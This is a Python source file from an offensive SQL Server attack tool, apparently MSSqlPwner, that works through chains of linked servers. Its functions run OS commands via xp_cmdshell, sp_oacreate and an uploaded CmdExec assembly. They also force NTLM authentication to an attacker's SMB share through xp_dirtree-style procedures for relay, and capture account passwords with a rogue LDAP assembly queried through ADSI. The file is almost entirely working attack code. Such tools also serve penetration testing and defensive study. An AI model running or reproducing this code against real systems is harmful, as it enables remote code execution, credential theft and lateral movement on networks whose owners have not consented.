########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.1'
__email__ = ['El3ct71k@gmail.com']

########################################################

import os
import sys
import json
import time
import logging
import utilities
from impacket import LOG
from typing import Literal
from playbooks import Queries
from classes.operations import Operations
from impacket.examples.utils import parse_target


class Playbooks(Operations):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, user_name, args_options)

    def disconnect(self) -> None:
        """
        This function is responsible to revert to SELF and disconnect from the server.
        """
        self.call_rev2self()
        super().disconnect()

    def enumerate(self) -> bool:
        """
        This function is responsible to enumerate the server.
        """
        if os.path.exists(self.state_filename):
            if self.use_state:
                if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
                                                             ["y", "n"], 'y'):
                    self.state = json.load(open(self.state_filename))
                else:
                    if not self.retrieve_server_information():
                        return False
                    self.retrieve_links()
        else:
            if not self.retrieve_server_information():
                return False
            self.retrieve_links()

        utilities.store_state(self.state_filename, self.state)
        utilities.print_state(self.state)
        return True

    def execute_command_by_procedure(self, linked_server: str,
                                     command_execution_method: Literal['xp_cmdshell', 'sp_oacreate'], command: str):
        """
        This function is responsible to execute a command on the server using existing procedures.
        e.g. xp_cmdshell, sp_oacreate
        """
        if not command:
            LOG.error("Command is required for exec module")
            return False

        return self.procedure_chain_builder(self.execute_procedure, [command_execution_method, command],
                                            linked_server=linked_server)

    def ntlm_relay(self, linked_server: str, relay_method: Literal['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
                   smb_server: str):
        """
        This function is responsible to execute a ntlm-relay attack on the server using existing procedures.
        e.g. xp_dirtree, xp_subdirs, xp_fileexist
        """
        if not smb_server:
            LOG.error("SMB server is required for ntlm-relay module")
            return False

        share = fr"\\{smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
        return self.procedure_chain_builder(self.execute_procedure, [relay_method, share], linked_server=linked_server)

    def execute_direct_query(self, link_server: str, method: Literal['OpenQuery', 'exec_at'], query: str):
        """
        This function is responsible to execute a query on the server.
        e.g. OpenQuery, exec_at
        """
        if not query:
            LOG.error("Query is required for direct_query module")
            return False
        return self.procedure_chain_builder(self.direct_query, [query], linked_server=link_server, method=method)

    def retrieve_password(self, linked_server: str, port: int, adsi_provider: str,
                          arch: Literal['autodetect', 'x86', 'x64'], target: str) -> bool:
        """
        This function is responsible to retrieve passwords from the server using custom assemblies.
        """
        domain, username, password, address = parse_target(target)
        for server_info in self.filter_server_by_chain_str(linked_server):
            arch = self.detect_architecture(server_info['chain_str'], arch)
            if not arch:
                LOG.error(f"Failed to detect the architecture of {linked_server}")
                return False

            ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
            ldap_assembly = os.path.join(self.custom_asm_directory, ldap_filename)
            if not server_info['adsi_providers']:
                continue

            if adsi_provider and adsi_provider not in server_info['adsi_providers']:
                LOG.error(f"The {linked_server} server does not support the {adsi_provider} provider")
                return False

            for discovered_provider in server_info['adsi_providers']:
                if adsi_provider and adsi_provider != discovered_provider:
                    continue
                if not adsi_provider:
                    if (not self.auto_yes) and not utilities.receive_answer(
                            f"Do you want to retrieve passwords from {discovered_provider} provider?",
                            ["y", "n"], 'y'):
                        continue

                if self.procedure_chain_builder(self.execute_custom_assembly_function,
                                                [ldap_assembly, "listen", "LdapSrv", "ldapAssembly",
                                                 str(port)], linked_server=linked_server):
                    time.sleep(1)
                    client = Playbooks(self.server_address, self.username, self.options)
                    client.options.debug = False
                    LOG.setLevel(logging.ERROR)
                    client.connect(username, password, domain)
                    client.state = self.state
                    LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
                    client.options.debug = self.options.debug
                    chained_query = self.build_query_chain(server_info['chain_tree'] + [discovered_provider],
                                                           Queries.LDAP_QUERY.format(port=port), "OpenQuery")

                    client.custom_sql_query(chained_query, wait=True)
                    LOG.info("Sleeping for 5 seconds..")
                    time.sleep(5)
                    client.disconnect()
                    tds_data = self.ms_sql.recvTDS()
                    self.ms_sql.replies = self.ms_sql.parseReply(tds_data['Data'], False)

                    results = self.parse_logs()
                    if results and results['is_success']:
                        LOG.info(f"Successfully retrieved password from {server_info['chain_str']}")
                        for credentials in results['results'][0].values():
                            LOG.info(f"[+] Discovered credentials: {credentials}")
                    else:
                        LOG.warning(f"Failed to retrieve password from {server_info['chain_str']}")
        return True

    def get_chain_list(self) -> bool:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Chain list:")
        for server_info in self.sort_servers_by_chain_id():
            username = server_info['server_user']
            db_user = server_info['db_user']
            chain_str = server_info['chain_str']
            LOG.info(f"{server_info['chain_id']} - {chain_str} (Server user: {username} | DB User: {db_user})")
        return True

    def get_linked_server_list(self) -> bool:
        """
        This function is responsible to return the chain list.
        """
        LOG.info("Linked_server_list:")
        link_servers = []
        for server_info in self.sort_servers_by_chain_id():
            link_name = server_info['link_name']
            if link_name in link_servers:
                continue
            link_servers.append(link_name)
            LOG.info(f"{link_name}")
        return True

    def call_rev2self(self) -> bool:
        """
        This function is responsible to revert the database to the previous state.
        """
        if not self.rev2self:
            LOG.info("Nothing to revert")
            return True
        LOG.info("Reverting to self..")
        for linked_server, query_list in self.rev2self.items():
            for query in reversed(query_list):
                self.custom_sql_query(query, linked_server)
            LOG.info(f"Successfully reverted to self on {linked_server}")
        self.rev2self.clear()
        return True

    def get_rev2self_queries(self) -> bool:
        """
        This function is responsible to retrieve the commands that are needed to revert to self.
        """
        for linked_server, queries in self.rev2self.items():
            for query in queries:
                LOG.info(f"{linked_server}: {query}")
        return True

    def interactive_mode(self, options) -> bool:
        chosen_chain_id = options.chain_id
        chosen_link_server = options.link_server
        parser, available_modules = utilities.generate_arg_parser()
        available_modules.remove("interactive")
        available_modules += ["help", "exit", ]

        while True:
            try:
                chosen_link_server = chosen_link_server if chosen_link_server else self.state['local_hostname']
                title = self.get_title(chosen_link_server)

                args_list = input(f"MSSqlPwner#{title}> ").strip()
                if args_list.split(" ")[0] not in available_modules:
                    LOG.error(f"Unknown module {args_list.split(' ')[0]}, you can use: {', '.join(available_modules)}")
                    continue
                elif args_list == "exit":
                    break
                elif args_list == "help":
                    parser.print_help()
                    continue
                arguments = utilities.split_exclude_quotes(f'{" ".join(sys.argv[1:-1]).strip()} {args_list}')
                args = parser.parse_args(arguments)
                args.chain_id = chosen_chain_id
                args.link_server = chosen_link_server
                if args.module == "enumerate":
                    self.enumerate()
                    continue
                elif args.module == "set-chain":
                    chosen_link_server = None
                    self.chain_id = args.chain
                    if not self.is_valid_chain_id():
                        LOG.error("Chain id is not valid!")
                        self.chain_id = None
                        continue
                    chosen_chain_id = args.chain
                    continue
                elif args.module == "set-link-server":
                    chosen_chain_id = None
                    self.chain_id = None
                    if not self.is_valid_link_server(args.link):
                        LOG.error("Linked server is not valid!")
                        continue
                    chosen_link_server = args.link
                    continue

                if not self.execute_module(args):
                    continue

            except KeyboardInterrupt:
                break
        return True

    def custom_asm(self, linked_server: str, arch: Literal['autodetect', 'x86', 'x64'], procedure_name: str,
                   command: str) -> bool:
        if not command:
            LOG.error("Command is required for custom-asm module")
            return False

        arch_name = self.detect_architecture(linked_server, arch)
        if not arch_name:
            LOG.error(f"Failed to detect the architecture of {linked_server}")
            return False

        asm_filename = "CmdExec-x64.dll" if arch_name == 'x64' else "CmdExec-x86.dll"
        file_location = os.path.join(self.custom_asm_directory, asm_filename)
        return self.procedure_chain_builder(self.execute_custom_assembly_procedure,
                                            [file_location, procedure_name, command, "CalcAsm"],
                                            linked_server=linked_server)

    def encapsulated_commands(self, chain_str: str, options):
        ret_val = False
        if options.module == 'exec':
            ret_val = self.execute_command_by_procedure(chain_str, options.command_execution_method, options.command)

        elif options.module == 'ntlm-relay':
            ret_val = self.ntlm_relay(chain_str, options.relay_method, options.smb_server)

        elif options.module == 'custom-asm':
            ret_val = self.custom_asm(chain_str, options.arch, options.procedure_name, options.command)

        elif options.module == 'direct_query':
            ret_val = self.execute_direct_query(chain_str, options.method, options.query)

        elif options.module == 'retrieve-password':
            ret_val = self.retrieve_password(chain_str, options.listen_port, options.adsi_provider, options.arch,
                                             options.target)

        elif options.module == 'get-chain-list':
            ret_val = self.get_chain_list()
        elif options.module == 'get-link-server-list':
            ret_val = self.get_linked_server_list()
        elif options.module == 'rev2self':
            ret_val = self.call_rev2self()
        elif options.module == 'get-rev2self-queries':
            ret_val = self.get_rev2self_queries()
        elif options.module == "interactive":
            ret_val = self.interactive_mode(options)
        return ret_val

    def execute_module(self, options):
        """
        This function is responsible to execute the given module.
        """

        if options.module == "enumerate":
            # It returned without calling since it is already called in the main function.
            return True

        link_server = options.link_server if options.link_server else self.state['local_hostname']
        if options.chain_id:
            if not self.is_valid_chain_id():
                return False
            filtered_chains = self.filter_server_by_chain_id(options.chain_id)

        else:
            if not self.is_valid_link_server(link_server):
                return False
            filtered_chains = self.filter_server_by_link_name(link_server)

        for server_info in filtered_chains:
            chain_str = server_info['chain_str']
            if not self.encapsulated_commands(chain_str, options):
                LOG.error(f"Failed to execute {options.module} module on {chain_str}")
                continue
            LOG.info(f"Successfully executed {options.module} module on {chain_str}")
            break
        return True
